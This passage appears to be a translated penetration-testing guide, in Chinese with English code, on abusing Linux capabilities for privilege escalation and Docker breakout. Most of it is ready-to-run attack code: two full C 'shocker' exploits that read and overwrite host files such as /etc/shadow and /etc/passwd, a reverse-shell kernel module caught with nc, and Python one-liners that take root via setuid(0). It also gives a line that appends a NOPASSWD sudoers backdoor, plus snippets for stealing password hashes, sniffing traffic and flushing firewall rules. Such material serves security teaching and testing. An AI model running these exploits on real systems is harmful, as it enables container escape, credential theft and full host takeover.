```bash
Make[1]: *** /lib/modules/5.10.0-kali7-amd64/build: No such file or directory.  Stop.

sudo apt update
sudo apt full-upgrade
```
最后，在一个 shell 中启动 `nc`，然后从另一个 shell 中**加载该 module**，这样你就会在 nc 进程中捕获到该 shell：
```bash
#Shell 1
nc -lvnp 4444

#Shell 2
insmod reverse-shell.ko #Launch the reverse shell
```
**该技术的代码复制自 "Abusing SYS_MODULE Capability" 实验室，地址为** [**https://www.pentesteracademy.com/**](https://www.pentesteracademy.com)。<sup>[[1]](#references)</sup>

该技术的另一个示例见于 [https://www.cyberark.com/resources/threat-research-blog/how-i-hacked-play-with-docker-and-remotely-ran-code-on-the-host](https://www.cyberark.com/resources/threat-research-blog/how-i-hacked-play-with-docker-and-remotely-ran-code-on-the-host)

## CAP_DAC_READ_SEARCH

[**CAP_DAC_READ_SEARCH**](https://man7.org/linux/man-pages/man7/capabilities.7.html) 允许进程**绕过文件读取权限，以及目录读取和执行权限**。它主要用于文件搜索或读取。但它还允许进程使用 `open_by_handle_at(2)` 函数访问任何文件，包括进程挂载命名空间之外的文件。`open_by_handle_at(2)` 使用的句柄本应是通过 `name_to_handle_at(2)` 获取的非透明标识符，但其中可能包含易受篡改的敏感信息，例如 inode 编号。Sebastian Krahmer 通过 shocker exploit 展示了利用此 capability 的可能性，尤其是在 Docker 容器环境中；具体分析见 [此处](https://medium.com/@fun_cuddles/docker-breakout-exploit-analysis-a274fff0e6b3)。<sup>[[12]](#references)[[13]](#references)</sup>
**这意味着你可以绕过文件读取权限检查，以及目录读取/执行权限检查**。<sup>[[14]](#references)</sup>

**二进制文件示例**

该二进制文件可以读取其命名空间中可访问的文件。因此，如果像 `tar` 这样的文件具有此 capability，它就可以读取 shadow 文件：
```bash
cd /etc
tar -czf /tmp/shadow.tar.gz shadow #Compress show file in /tmp
cd /tmp
tar -cxf shadow.tar.gz
```
**binary2 示例**

在此情况下，假设 **`python`** binary 具有此 capability。要列出 root 文件，可以执行：
```python
import os
for r, d, f in os.walk('/root'):
for filename in f:
print(filename)
```
为了读取文件，你可以执行：
```python
print(open("/etc/shadow", "r").read())
```
**环境中的示例（Docker breakout）**

你可以使用 `capsh --print` 检查 Docker container 内启用的 capabilities。<sup>[[14]](#references)[[26]](#references)</sup>
```
capsh --print
Current: = cap_chown,cap_dac_override,cap_dac_read_search,cap_fowner,cap_fsetid,cap_kill,cap_setgid,cap_setuid,cap_setpcap,cap_net_bind_service,cap_net_raw,cap_sys_chroot,cap_mknod,cap_audit_write,cap_setfcap+ep
Bounding set =cap_chown,cap_dac_override,cap_dac_read_search,cap_fowner,cap_fsetid,cap_kill,cap_setgid,cap_setuid,cap_setpcap,cap_net_bind_service,cap_net_raw,cap_sys_chroot,cap_mknod,cap_audit_write,cap_setfcap
Securebits: 00/0x0/1'b0
secure-noroot: no (unlocked)
secure-no-suid-fixup: no (unlocked)
secure-keep-caps: no (unlocked)
uid=0(root)
gid=0(root)
groups=0(root)
```
在之前的输出中可以看到，**DAC_READ_SEARCH** capability 已启用。它会绕过 DAC 读取/搜索检查，并允许使用 `open_by_handle_at(2)`；其本身并不是 process-debugging capability。<sup>[[14]](#references)</sup>

你可以在 [https://medium.com/@fun_cuddles/docker-breakout-exploit-analysis-a274fff0e6b3](https://medium.com/@fun_cuddles/docker-breakout-exploit-analysis-a274fff0e6b3) 中了解以下 exploit 的工作原理，但简而言之，**CAP_DAC_READ_SEARCH** 允许在不进行 permission checks 的情况下遍历文件系统，并允许使用 `open_by_handle_at(2)`；当相关 namespaces 和 mounts 可访问时，这可能暴露由其他 processes 打开的文件。<sup>[[13]](#references)[[14]](#references)</sup>

利用这些 permissions 从 host 读取文件的原始 exploit 可以在此处找到：[http://stealth.openwall.net/xSports/shocker.c](http://stealth.openwall.net/xSports/shocker.c)；以下是一个**修改后的版本，它允许你将要读取的文件作为第一个参数传入，并将结果 dump 到文件中**。<sup>[[12]](#references)</sup>
```c
#include <stdio.h>
#include <sys/types.h>
#include <sys/stat.h>
#include <fcntl.h>
#include <errno.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include <dirent.h>
#include <stdint.h>

// gcc shocker.c -o shocker
// ./socker /etc/shadow shadow #Read /etc/shadow from host and save result in shadow file in current dir

struct my_file_handle {
unsigned int handle_bytes;
int handle_type;
unsigned char f_handle[8];
};

void die(const char *msg)
{
perror(msg);
exit(errno);
}

void dump_handle(const struct my_file_handle *h)
{
fprintf(stderr,"[*] #=%d, %d, char nh[] = {", h->handle_bytes,
h->handle_type);
for (int i = 0; i < h->handle_bytes; ++i) {
fprintf(stderr,"0x%02x", h->f_handle[i]);
if ((i + 1) % 20 == 0)
fprintf(stderr,"\n");
if (i < h->handle_bytes - 1)
fprintf(stderr,", ");
}
fprintf(stderr,"};\n");
}

int find_handle(int bfd, const char *path, const struct my_file_handle *ih, struct my_file_handle
*oh)
{
int fd;
uint32_t ino = 0;
struct my_file_handle outh = {
.handle_bytes = 8,
.handle_type = 1
};
DIR *dir = NULL;
struct dirent *de = NULL;
path = strchr(path, '/');
// recursion stops if path has been resolved
if (!path) {
memcpy(oh->f_handle, ih->f_handle, sizeof(oh->f_handle));
oh->handle_type = 1;
oh->handle_bytes = 8;
return 1;
}

++path;
fprintf(stderr, "[*] Resolving '%s'\n", path);
if ((fd = open_by_handle_at(bfd, (struct file_handle *)ih, O_RDONLY)) < 0)
die("[-] open_by_handle_at");
if ((dir = fdopendir(fd)) == NULL)
die("[-] fdopendir");
for (;;) {
de = readdir(dir);
if (!de)
break;
fprintf(stderr, "[*] Found %s\n", de->d_name);
if (strncmp(de->d_name, path, strlen(de->d_name)) == 0) {
fprintf(stderr, "[+] Match: %s ino=%d\n", de->d_name, (int)de->d_ino);
ino = de->d_ino;
break;
}
}

fprintf(stderr, "[*] Brute forcing remaining 32bit. This can take a while...\n");
if (de) {
for (uint32_t i = 0; i < 0xffffffff; ++i) {
outh.handle_bytes = 8;
outh.handle_type = 1;
memcpy(outh.f_handle, &ino, sizeof(ino));
memcpy(outh.f_handle + 4, &i, sizeof(i));
if ((i % (1<<20)) == 0)
fprintf(stderr, "[*] (%s) Trying: 0x%08x\n", de->d_name, i);
if (open_by_handle_at(bfd, (struct file_handle *)&outh, 0) > 0) {
closedir(dir);
close(fd);
dump_handle(&outh);
return find_handle(bfd, path, &outh, oh);
}
}
}
closedir(dir);
close(fd);
return 0;
}


int main(int argc,char* argv[] )
{
char buf[0x1000];
int fd1, fd2;
struct my_file_handle h;
struct my_file_handle root_h = {
.handle_bytes = 8,
.handle_type = 1,
.f_handle = {0x02, 0, 0, 0, 0, 0, 0, 0}
};

fprintf(stderr, "[***] docker VMM-container breakout Po(C) 2014 [***]\n"
"[***] The tea from the 90's kicks your sekurity again. [***]\n"
"[***] If you have pending sec consulting, I'll happily [***]\n"
"[***] forward to my friends who drink secury-tea too! [***]\n\n<enter>\n");

read(0, buf, 1);

// get a FS reference from something mounted in from outside
if ((fd1 = open("/etc/hostname", O_RDONLY)) < 0)
die("[-] open");

if (find_handle(fd1, argv[1], &root_h, &h) <= 0)
die("[-] Cannot find valid handle!");

fprintf(stderr, "[!] Got a final handle!\n");
dump_handle(&h);

if ((fd2 = open_by_handle_at(fd1, (struct file_handle *)&h, O_RDONLY)) < 0)
die("[-] open_by_handle");

memset(buf, 0, sizeof(buf));
if (read(fd2, buf, sizeof(buf) - 1) < 0)
die("[-] read");

printf("Success!!\n");

FILE *fptr;
fptr = fopen(argv[2], "w");
fprintf(fptr,"%s", buf);
fclose(fptr);

close(fd2); close(fd1);

return 0;
}
```
> [!WARNING]
> 该 exploit 需要找到一个指向主机上某个已挂载对象的指针。原始 exploit 使用文件 /.dockerinit，而这个修改后的版本使用 /etc/hostname。如果 exploit 无法工作，可能需要设置其他文件。要查找主机上已挂载的文件，只需执行 mount command：

![CAP SYS MODULE - CAP DAC READ SEARCH：该 exploit 需要找到一个指向主机上某个已挂载对象的指针。原始 exploit 使用文件 /.dockerinit，而这个修改后的版本使用……](<../../images/image (407) (1).png>)

**该 technique 的代码复制自** [**https://www.pentesteracademy.com/**](https://www.pentesteracademy.com) **的 "Abusing DAC_READ_SEARCH Capability" laboratory。**<sup>[[1]](#references)</sup>


## CAP_DAC_OVERRIDE

**该 capability 可以绕过文件的读取、写入和执行权限检查**。<sup>[[14]](#references)</sup>

查找通过加入 privileged group 后变得可读或可写的文件；有用的目标取决于目标的所有权和 mode bits。<sup>[[14]](#references)</sup>

**使用 binary 的示例**

在此示例中，vim 具有此 capability，因此你可以修改任何文件，例如 _passwd_、_sudoers_ 或 _shadow_：
```bash
getcap -r / 2>/dev/null
/usr/bin/vim = cap_dac_override+ep

vim /etc/sudoers #To overwrite it
```
**使用 binary 2 的示例**

在此示例中，**`python`** binary 将拥有此 capability。你可以使用 python 覆盖任意文件：
```python
file=open("/etc/sudoers","a")
file.write("yourusername ALL=(ALL) NOPASSWD:ALL")
file.close()
```
**使用环境和 CAP_DAC_READ_SEARCH 的示例（Docker breakout）**

如前面的 `CAP_DAC_READ_SEARCH` 环境示例所示，使用 `capsh --print` 确认 `CAP_DAC_OVERRIDE`。<sup>[[14]](#references)[[26]](#references)</sup>

首先阅读上一节，该节介绍了如何[**滥用 DAC_READ_SEARCH capability 读取主机上的任意文件**](linux-capabilities.md#cap_dac_read_search)，并**编译**该 exploit。\
然后，**编译以下版本的 shocker exploit**，它将允许你在主机文件系统中**写入任意文件**：
```c
#include <stdio.h>
#include <sys/types.h>
#include <sys/stat.h>
#include <fcntl.h>
#include <errno.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include <dirent.h>
#include <stdint.h>

// gcc shocker_write.c -o shocker_write
// ./shocker_write /etc/passwd passwd

struct my_file_handle {
unsigned int handle_bytes;
int handle_type;
unsigned char f_handle[8];
};
void die(const char * msg) {
perror(msg);
exit(errno);
}
void dump_handle(const struct my_file_handle * h) {
fprintf(stderr, "[*] #=%d, %d, char nh[] = {", h -> handle_bytes,
h -> handle_type);
for (int i = 0; i < h -> handle_bytes; ++i) {
fprintf(stderr, "0x%02x", h -> f_handle[i]);
if ((i + 1) % 20 == 0)
fprintf(stderr, "\n");
if (i < h -> handle_bytes - 1)
fprintf(stderr, ", ");
}
fprintf(stderr, "};\n");
}
int find_handle(int bfd, const char *path, const struct my_file_handle *ih, struct my_file_handle *oh)
{
int fd;
uint32_t ino = 0;
struct my_file_handle outh = {
.handle_bytes = 8,
.handle_type = 1
};
DIR * dir = NULL;
struct dirent * de = NULL;
path = strchr(path, '/');
// recursion stops if path has been resolved
if (!path) {
memcpy(oh -> f_handle, ih -> f_handle, sizeof(oh -> f_handle));
oh -> handle_type = 1;
oh -> handle_bytes = 8;
return 1;
}
++path;
fprintf(stderr, "[*] Resolving '%s'\n", path);
if ((fd = open_by_handle_at(bfd, (struct file_handle * ) ih, O_RDONLY)) < 0)
die("[-] open_by_handle_at");
if ((dir = fdopendir(fd)) == NULL)
die("[-] fdopendir");
for (;;) {
de = readdir(dir);
if (!de)
break;
fprintf(stderr, "[*] Found %s\n", de -> d_name);
if (strncmp(de -> d_name, path, strlen(de -> d_name)) == 0) {
fprintf(stderr, "[+] Match: %s ino=%d\n", de -> d_name, (int) de -> d_ino);
ino = de -> d_ino;
break;
}
}
fprintf(stderr, "[*] Brute forcing remaining 32bit. This can take a while...\n");
if (de) {
for (uint32_t i = 0; i < 0xffffffff; ++i) {
outh.handle_bytes = 8;
outh.handle_type = 1;
memcpy(outh.f_handle, & ino, sizeof(ino));
memcpy(outh.f_handle + 4, & i, sizeof(i));
if ((i % (1 << 20)) == 0)
fprintf(stderr, "[*] (%s) Trying: 0x%08x\n", de -> d_name, i);
if (open_by_handle_at(bfd, (struct file_handle * ) & outh, 0) > 0) {
closedir(dir);
close(fd);
dump_handle( & outh);
return find_handle(bfd, path, & outh, oh);
}
}
}
closedir(dir);
close(fd);
return 0;
}
int main(int argc, char * argv[]) {
char buf[0x1000];
int fd1, fd2;
struct my_file_handle h;
struct my_file_handle root_h = {
.handle_bytes = 8,
.handle_type = 1,
.f_handle = {
0x02,
0,
0,
0,
0,
0,
0,
0
}
};
fprintf(stderr, "[***] docker VMM-container breakout Po(C) 2014 [***]\n"
"[***] The tea from the 90's kicks your sekurity again. [***]\n"
"[***] If you have pending sec consulting, I'll happily [***]\n"
"[***] forward to my friends who drink secury-tea too! [***]\n\n<enter>\n");
read(0, buf, 1);
// get a FS reference from something mounted in from outside
if ((fd1 = open("/etc/hostname", O_RDONLY)) < 0)
die("[-] open");
if (find_handle(fd1, argv[1], & root_h, & h) <= 0)
die("[-] Cannot find valid handle!");
fprintf(stderr, "[!] Got a final handle!\n");
dump_handle( & h);
if ((fd2 = open_by_handle_at(fd1, (struct file_handle * ) & h, O_RDWR)) < 0)
die("[-] open_by_handle");
char * line = NULL;
size_t len = 0;
FILE * fptr;
ssize_t read;
fptr = fopen(argv[2], "r");
while ((read = getline( & line, & len, fptr)) != -1) {
write(fd2, line, read);
}
printf("Success!!\n");
close(fd2);
close(fd1);
return 0;
}
```
为了逃逸 Docker container，你可以从 host **download** 文件 `/etc/shadow` 和 `/etc/passwd`，向其中**添加**一个**新用户**，然后使用 **`shocker_write`** 覆盖它们。之后，通过 **ssh** **访问**。

**该 technique 的代码复制自** [**https://www.pentesteracademy.com**](https://www.pentesteracademy.com) 的 "Abusing DAC_OVERRIDE Capability" laboratory。<sup>[[1]](#references)</sup>

## CAP_CHOWN

**此 capability 允许进程更改文件的所有权**。<sup>[[14]](#references)</sup>

**使用 binary 的示例**

假设 **`python`** binary 具有此 capability；你可以更改某个文件（例如 **`shadow`**）的所有者，然后在其他 permissions 允许的情况下，利用获得的 access 对其进行修改：
```bash
python -c 'import os;os.chown("/etc/shadow",1000,1000)'
```
或者 **`ruby`** 二进制文件具有此 capability：
```bash
ruby -e 'require "fileutils"; FileUtils.chown(1000, 1000, "/etc/shadow")'
```
## CAP_FOWNER

**此 capability 可绕过许多文件操作的所有权检查，包括更改权限**。<sup>[[14]](#references)</sup>

**使用 binary 的示例**

如果 python 具有此 capability，你可以修改 shadow file 的权限、**更改 root 密码**，并提升权限：
```bash
python -c 'import os; os.chmod("/etc/shadow", 0o666)'
```
### CAP_SETUID

**此 capability 允许进程更改其有效用户 ID，但须遵守内核实施的凭据和 capability 规则**。<sup>[[14]](#references)</sup>

**使用 binary 的示例**

如果 python 具有此 **capability**，就可以非常轻松地滥用它将权限提升至 root：
```python
import os
os.setuid(0)
os.system("/bin/bash")
```
**另一种方法：**
```python
import os
import prctl
#add the capability to the effective set
prctl.cap_effective.setuid = True
os.setuid(0)
os.system("/bin/bash")
```
## CAP_SETGID

**此 capability 允许进程更改其有效组 ID，但受 kernel 强制执行的凭据和 capability 规则约束**。<sup>[[14]](#references)</sup>

有许多文件可以**覆盖以提升权限，**[**你可以从这里获取思路**](../processes-crontab-systemd-dbus/payloads-to-execute.md#overwriting-a-file-to-escalate-privileges)。

**使用 binary 的示例**

在此情况下，你应该查找组可以读取的有趣文件，因为你可以 impersonate 任意组：
```bash
#Find every file writable by a group
find / -perm /g=w -exec ls -lLd {} \; 2>/dev/null
#Find every file writable by a group in /etc with a maxpath of 1
find /etc -maxdepth 1 -perm /g=w -exec ls -lLd {} \; 2>/dev/null
#Find every file readable by a group in /etc with a maxpath of 1
find /etc -maxdepth 1 -perm /g=r -exec ls -lLd {} \; 2>/dev/null
```
找到一个可以通过读取或写入来滥用以提升权限的文件后，你可以使用以下方式 **get a shell impersonating the interesting group**：
```python
import os
os.setgid(42)
os.system("/bin/bash")
```
在这种情况下，group shadow 被冒充，因此你可以读取文件 `/etc/shadow`：
```bash
cat /etc/shadow
```
### Combined chain: CAP_SETGID + CAP_CHOWN

当同一个 helper 中同时具备这两个 capabilities 时，一个实用的 chain 是：

1. 将 EGID 切换为 `shadow`（或其他 privileged group）。
2. 对 `/etc/shadow` 使用 `chown`，设置你的 UID，同时保留组 `shadow`。
3. 读取目标 hash，然后 crack/pivot。
```python
import os

# Replace values with real IDs from `id` / `getent group shadow`
LAB_UID = 1000
SHADOW_GID = 42

os.setgid(SHADOW_GID)
os.chown("/etc/shadow", LAB_UID, SHADOW_GID)
os.system("grep '^root:' /etc/shadow > /tmp/root.hash")
```
这避免了直接获取完整 root 权限的需要，并且通常足以通过 credential reuse 实现 pivot。

如果已安装 **docker**，你可以 **impersonate** **docker group**，并滥用它与 [**docker socket** 通信并提升权限](#writable-docker-socket)。

## CAP_SETFCAP

**此 capability 允许进程设置 file capabilities**。<sup>[[14]](#references)</sup>

**Example with binary**

如果 python 具有此 **capability**，你可以非常轻松地滥用它将权限提升至 root：
```python:setcapability.py
import ctypes, sys

#Load needed library
#You can find which library you need to load checking the libraries of local setcap binary
# ldd /sbin/setcap
libcap = ctypes.cdll.LoadLibrary("libcap.so.2")

libcap.cap_from_text.argtypes = [ctypes.c_char_p]
libcap.cap_from_text.restype = ctypes.c_void_p
libcap.cap_set_file.argtypes = [ctypes.c_char_p,ctypes.c_void_p]

#Give setuid cap to the binary
cap = 'cap_setuid+ep'
path = sys.argv[1]
print(path)
cap_t = libcap.cap_from_text(cap)
status = libcap.cap_set_file(path,cap_t)

if(status == 0):
print (cap + " was successfully added to " + path)
```

```bash
python setcapability.py /usr/bin/python2.7
```
> [!WARNING]
> 新写入的 file capability set 会替换之前的 set；如果随后仅使用新的 capabilities 执行 helper，它可能不再保留 `CAP_SETFCAP`，因而无法更新其他文件。<sup>[[14]](#references)[[25]](#references)</sup>

获得 [SETUID capability](linux-capabilities.md#cap_setuid) 后，可以转到其章节查看如何提升权限。

**使用 environment 的示例（Docker breakout）**

Docker 文档记载的默认 capability set 包含 **CAP_SETFCAP**，但实际的 set 取决于 runtime configuration。<sup>[[19]](#references)</sup>
你可以使用以下命令检查进程 capabilities：
```bash
cat /proc/`pidof bash`/status | grep Cap
CapInh: 00000000a80425fb
CapPrm: 00000000a80425fb
CapEff: 00000000a80425fb
CapBnd: 00000000a80425fb
CapAmb: 0000000000000000

capsh --decode=00000000a80425fb
0x00000000a80425fb=cap_chown,cap_dac_override,cap_fowner,cap_fsetid,cap_kill,cap_setgid,cap_setuid,cap_setpcap,cap_net_bind_service,cap_net_raw,cap_sys_chroot,cap_mknod,cap_audit_write,cap_setfcap
```
此 capability 允许写入文件 capabilities，但它本身不会将这些 capabilities 授予当前进程，也不会绕过执行该文件时所应用的文件、bounding-set 和 namespace 规则。<sup>[[14]](#references)</sup>
```bash
getcap /usr/bin/gdb
/usr/bin/gdb = cap_sys_ptrace,cap_sys_admin+eip

setcap cap_sys_admin,cap_sys_ptrace+eip /usr/bin/gdb

/usr/bin/gdb
bash: /usr/bin/gdb: Operation not permitted
```
文件允许的 capabilities 受进程 capability bounding set 限制，而文件的 effective bit 控制文件的 permitted set 是否会被提升到进程的 effective set 中。这就是为什么向文件添加 capabilities 并不会自动使每个请求的 capability 都能在执行时使用。<sup>[[14]](#references)</sup>

## CAP_SYS_RAWIO

[**CAP_SYS_RAWIO**](https://man7.org/linux/man-pages/man7/capabilities.7.html) 提供多种敏感操作，包括访问 `/dev/mem`、`/dev/kmem` 或 `/proc/kcore`，修改 `mmap_min_addr`，访问 `ioperm(2)` 和 `iopl(2)` system calls，以及执行各种磁盘命令。通过此 capability 还会启用 `FIBMAP ioctl(2)`，这在[过去](http://lkml.iu.edu/hypermail/linux/kernel/9907.0/0132.html)曾引发问题。根据 man page，这还允许持有者对其他设备执行一系列特定于设备的操作。<sup>[[14]](#references)</sup>

这对于 **privilege escalation** 和 **Docker breakout** 很有用。<sup>[[14]](#references)</sup>

## CAP_KILL

**此 capability 可绕过 kernel 定义情况下向进程发送 signals 时的 permission checks。**<sup>[[14]](#references)</sup>

**使用 binary 的示例**

假设 **`python`** binary 具有此 capability。如果你还能够**修改某个 service 或 socket 的配置**（或任何与 service 相关的 configuration file），就可以对其植入后门，然后终止与该 service 相关的进程，并等待新的 configuration file 通过你的后门执行。
```python
#Use this python code to kill arbitrary processes
import os
import signal
pgid = os.getpgid(341)
os.killpg(pgid, signal.SIGKILL)
```
**使用 kill 进行提权**

如果你拥有 kill capabilities，并且有一个以 root（或其他用户）身份运行的 **node program**，你可能可以向它**发送** **signal SIGUSR1**，使其**打开 node debugger**，然后连接到该 debugger。
```bash
kill -s SIGUSR1 <nodejs-ps>
# After an URL to access the debugger will appear. e.g. ws://127.0.0.1:9229/45ea962a-29dd-4cdd-be08-a6827840553d
```
{{#ref}}
../software-information/electron-cef-chromium-debugger-abuse.md
{{#endref}}


## CAP_NET_BIND_SERVICE

**此 capability 允许绑定到 1024 以下的 Internet 端口。** 它不会直接授予更广泛的 privilege escalation 权限。<sup>[[14]](#references)</sup>

**使用 binary 的示例**

如果 **`python`** 具有此 capability，它将能够监听任意端口，甚至从该端口连接到其他任意端口（某些服务要求连接必须来自特定的 privileged 端口）

{{#tabs}}
{{#tab name="Listen"}}
```python
import socket
s=socket.socket()
s.bind(('0.0.0.0', 80))
s.listen(1)
conn, addr = s.accept()
while True:
output = connection.recv(1024).strip();
print(output)
```
{{#endtab}}

{{#tab name="Connect"}}
```python
import socket
s=socket.socket()
s.bind(('0.0.0.0',500))
s.connect(('10.10.10.10',500))
```
{{#endtab}}
{{#endtabs}}

## CAP_NET_RAW

[**CAP_NET_RAW**](https://man7.org/linux/man-pages/man7/capabilities.7.html) 允许进程**创建 RAW 和 PACKET sockets**，使其能够生成并发送任意网络数据包。这可能在容器化环境中带来安全风险，例如数据包 spoofing、流量注入以及绕过网络访问控制。恶意行为者可能利用这一点干扰容器路由或危害主机网络安全，尤其是在缺乏足够 firewall 保护的情况下。此外，**CAP_NET_RAW** 支持通过 RAW ICMP 请求执行 ping 等操作。<sup>[[14]](#references)</sup>

**这可以通过适当的 socket 接口实现数据包捕获。** 它不会直接授予更广泛的权限提升能力。<sup>[[14]](#references)</sup>

**使用 binary 的示例**

如果 binary **`tcpdump`** 具有此 capability，你将能够使用它捕获网络信息。
```bash
getcap -r / 2>/dev/null
/usr/sbin/tcpdump = cap_net_raw+ep
```
如果 **environment** 授予此 capability，**`tcpdump`** 也可以利用它来 sniff 流量。<sup>[[14]](#references)</sup>

**使用 binary 2 的示例**

以下示例是 **`python2`** 代码，可用于拦截 "**lo**"（**localhost**）接口的流量。代码来自 [https://attackdefense.pentesteracademy.com/](https://attackdefense.pentesteracademy.com) 上的实验室 "_The Basics: CAP-NET_BIND + NET_RAW_"。<sup>[[1]](#references)</sup>
```python
import socket
import struct

flags=["NS","CWR","ECE","URG","ACK","PSH","RST","SYN","FIN"]

def getFlag(flag_value):
flag=""
for i in xrange(8,-1,-1):
if( flag_value & 1 <<i ):
flag= flag + flags[8-i] + ","
return flag[:-1]

s = socket.socket(socket.AF_PACKET, socket.SOCK_RAW, socket.htons(3))
s.setsockopt(socket.SOL_SOCKET, socket.SO_RCVBUF, 2**30)
s.bind(("lo",0x0003))

flag=""
count=0
while True:
frame=s.recv(4096)
ip_header=struct.unpack("!BBHHHBBH4s4s",frame[14:34])
proto=ip_header[6]
ip_header_size = (ip_header[0] & 0b1111) * 4
if(proto==6):
protocol="TCP"
tcp_header_packed = frame[ 14 + ip_header_size : 34 + ip_header_size]
tcp_header = struct.unpack("!HHLLHHHH", tcp_header_packed)
dst_port=tcp_header[0]
src_port=tcp_header[1]
flag=" FLAGS: "+getFlag(tcp_header[4])

elif(proto==17):
protocol="UDP"
udp_header_packed_ports = frame[ 14 + ip_header_size : 18 + ip_header_size]
udp_header_ports=struct.unpack("!HH",udp_header_packed_ports)
dst_port=udp_header[0]
src_port=udp_header[1]

if (proto == 17 or proto == 6):
print("Packet: " + str(count) + " Protocol: " + protocol + " Destination Port: " + str(dst_port) + " Source Port: " + str(src_port) + flag)
count=count+1
```
## CAP_NET_ADMIN + CAP_NET_RAW

[**CAP_NET_ADMIN**](https://man7.org/linux/man-pages/man7/capabilities.7.html) 授予持有者**修改网络配置**的权限，包括在公开的 network namespaces 中修改 firewall 设置、routing tables、socket permissions 和 network interface 设置。它还允许在 network interfaces 上启用 **promiscuous mode**，从而能够跨 namespaces 进行 packet sniffing。<sup>[[14]](#references)</sup>

**使用 binary 的示例**

假设 **python binary** 具有这些 capabilities。
```python
#Dump iptables filter table rules
import iptc
import pprint
json=iptc.easy.dump_table('filter',ipv6=False)
pprint.pprint(json)

#Flush iptables filter table
import iptc
iptc.easy.flush_table('filter')
```
## CAP_LINUX_IMMUTABLE

**此 capability 允许修改 inode flags，例如 immutable 和 append-only。**它不会直接授予更广泛的 privilege escalation 权限。<sup>[[14]](#references)</sup>

**使用 binary 的示例**

如果你发现某个文件是 immutable 的，而 python 具有此 capability，则可以**移除 immutable 属性，使文件可修改：**
```python
#Check that the file is imutable
lsattr file.sh
----i---------e--- backup.sh
```

```python
# Python code to remove the immutable flag and allow modifications
import fcntl
import os
import struct

FS_IMMUTABLE_FL = 0x00000010
FS_IOC_GETFLAGS = 0x80086601
FS_IOC_SETFLAGS = 0x40086602

fd = os.open('/path/to/file.sh', os.O_RDONLY)
flags = struct.unpack('i', fcntl.ioctl(fd, FS_IOC_GETFLAGS, struct.pack('i', 0)))[0]
fcntl.ioctl(fd, FS_IOC_SETFLAGS, struct.pack('i', flags & ~FS_IMMUTABLE_FL))
os.close(fd)

with open('/path/to/file.sh', 'a') as f:
f.write('New content for the file\n')
```
`FS_IOC_GETFLAGS` 和 `FS_IOC_SETFLAGS` 操作用于读取和更新 inode 标志；`FS_IMMUTABLE_FL` 是本示例中被清除的 immutable 标志。<sup>[[27]](#references)</sup>

> [!TIP]
> 注意，通常使用以下命令设置和移除 immutable 属性：
>
> ```bash
> sudo chattr +i file.txt
> sudo chattr -i file.txt
> ```

## CAP_SYS_CHROOT

[**CAP_SYS_CHROOT**](https://man7.org/linux/man-pages/man7/capabilities.7.html) 启用 `chroot(2)` system call 的执行，这可能允许通过已知漏洞逃逸 `chroot(2)` 环境。<sup>[[11]](#references)[[14]](#references)</sup>

- [如何从各种 chroot 解决方案中逃逸](https://deepsec.net/docs/Slides/2015/Chw00t_How_To_Break%20Out_from_Various_Chroot_Solutions_-_Bucsay_Balazs.pdf)。<sup>[[11]](#references)</sup>
- [chw00t：chroot escape tool](https://github.com/earthquake/chw00t/)

## CAP_SYS_BOOT

[**CAP_SYS_BOOT**](https://man7.org/linux/man-pages/man7/capabilities.7.html) 允许执行 `reboot(2)` system call 来重启系统，包括 `LINUX_REBOOT_CMD_RESTART2` 等命令；它还启用 `kexec_load(2)`，以及从 Linux 3.17 开始启用 `kexec_file_load(2)`，分别用于加载新的 crash kernel 或已签名的 crash kernel。<sup>[[14]](#references)</sup>

## CAP_SYSLOG

[**CAP_SYSLOG**](https://man7.org/linux/man-pages/man7/capabilities.7.html) 在 Linux 2.6.37 中从更宽泛的 **CAP_SYS_ADMIN** 中分离出来，专门授予使用 `syslog(2)` call 的能力。当 `kptr_restrict` 设置为 1 时，此 capability 可通过 `/proc` 及类似接口查看 kernel addresses；该设置用于控制 kernel addresses 的暴露程度。自 Linux 2.6.39 起，`kptr_restrict` 的默认值为 0，表示 kernel addresses 会被暴露，不过出于安全原因，许多 distributions 将其设置为 1（除 uid 0 外隐藏 addresses）或 2（始终隐藏 addresses）。<sup>[[14]](#references)</sup>

此外，当 `dmesg_restrict` 设置为 1 时，**CAP_SYSLOG** 允许访问 `dmesg` 输出。尽管发生了这些变化，由于历史原因，**CAP_SYS_ADMIN** 仍保留执行 `syslog` 操作的能力。<sup>[[14]](#references)</sup>

## CAP_MKNOD

[**CAP_MKNOD**](https://man7.org/linux/man-pages/man7/capabilities.7.html) 扩展了 `mknod` system call 的功能，使其不仅能创建普通文件、FIFO（named pipes）或 UNIX domain sockets，还能创建 special files，具体包括：<sup>[[14]](#references)</sup>

- **S_IFCHR**：Character special files，即 terminals 等设备。
- **S_IFBLK**：Block special files，即 disks 等设备。

对于需要创建 device files（包括 character 或 block devices）的 processes，此 capability 很有用。<sup>[[14]](#references)</sup>

它包含在 Docker 文档所列出的默认 capability set 中；应验证实际的 runtime configuration，而不是假设每个 deployment 都使用相同的默认值（[Moby default capability list](https://github.com/moby/moby/blob/master/oci/caps/defaults.go#L6-L19)）。<sup>[[19]](#references)</sup>

在满足以下条件时，此 capability 允许在 host 上执行 privilege escalations（通过读取整个 disk）：<sup>[[7]](#references)</sup>

1. 已获得 host 的初始访问权限（Unprivileged）。
2. 已获得 container 的初始访问权限（Privileged（EUID 0），且具有 effective `CAP_MKNOD`）。
3. Host 和 container 应共享同一个 user namespace。

**在 Container 中创建并访问 Block Device 的步骤：**

1. **在 Host 上以 Standard User 身份：**

- 使用 `id` 确定当前 user ID，例如 `uid=1000(standarduser)`。
- 确定目标 device，例如 `/dev/sdb`。

2. **在 Container 内以 `root` 身份：**
```bash
# Create a block special file for the host device
mknod /dev/sdb b 8 16
# Set read and write permissions for the user and group
chmod 660 /dev/sdb
# Add the corresponding standard user present on the host
useradd -u 1000 standarduser
# Switch to the newly created user
su standarduser
```
3. **回到主机端：**
```bash
# Locate the PID of the container process owned by "standarduser"
# This is an illustrative example; actual command might vary
ps aux | grep -i container_name | grep -i standarduser
# Assuming the found PID is 12345
# Access the container's filesystem and the special block device
head /proc/12345/root/dev/sdb
```
该方法允许标准用户通过容器访问并可能读取 `/dev/sdb` 中的数据，前提是设备、命名空间和权限按照所述方式进行配置。<sup>[[7]](#references)</sup>

### CAP_SETPCAP

